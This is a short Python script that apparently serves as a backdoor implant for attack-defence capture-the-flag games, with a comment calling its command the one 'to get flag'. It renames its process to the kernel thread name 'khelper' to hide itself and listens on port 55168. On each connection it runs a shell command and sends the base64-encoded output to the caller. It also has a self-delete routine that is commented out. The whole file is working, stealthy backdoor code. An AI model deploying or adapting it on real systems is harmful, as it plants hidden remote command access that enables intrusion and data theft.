#!/usr/bin/python
import time
import socket
import os
import base64
import traceback
import logging

cmd=r'whoami'#cmd to get flag
port=55168
interval=30 #wake up interval(seconds)

mode='development'
if mode=='development':
    log_format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'
    l=logging.DEBUG
elif mode=='product':
    log_format='%(asctime)s %(message)s'
    l=logging.INFO


logging.basicConfig(level=l,format=log_format,datefmt='%a, %d %b %Y %H:%M:%S')

def set_proc_name(newname):
    from ctypes import cdll, byref, create_string_buffer
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(newname)+1)
    buff.value = newname
    libc.prctl(15, byref(buff), 0, 0, 0)

def self_remove():
    filepath=os.path.abspath(sys.argv[0])
    #print filepath
    #os.remove(filepath)

if __name__=='__main__':
    #self_remove()
    set_proc_name('khelper')
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            address=('0.0.0.0',port)
            s.bind(address)
            s.listen(1)
            ss,ip=s.accept()
            # s.shutdown(socket.SHUT_RDWR)
            s.close()
            data=os.popen(cmd).read()
            logging.debug(data)
            ss.send(base64.b64encode(data))
            # ss.shutdown(socket.SHUT_RDWR)
            ss.close()
        except Exception as e:
            logging.debug(traceback.format_exc())
            #pass
        time.sleep(interval)
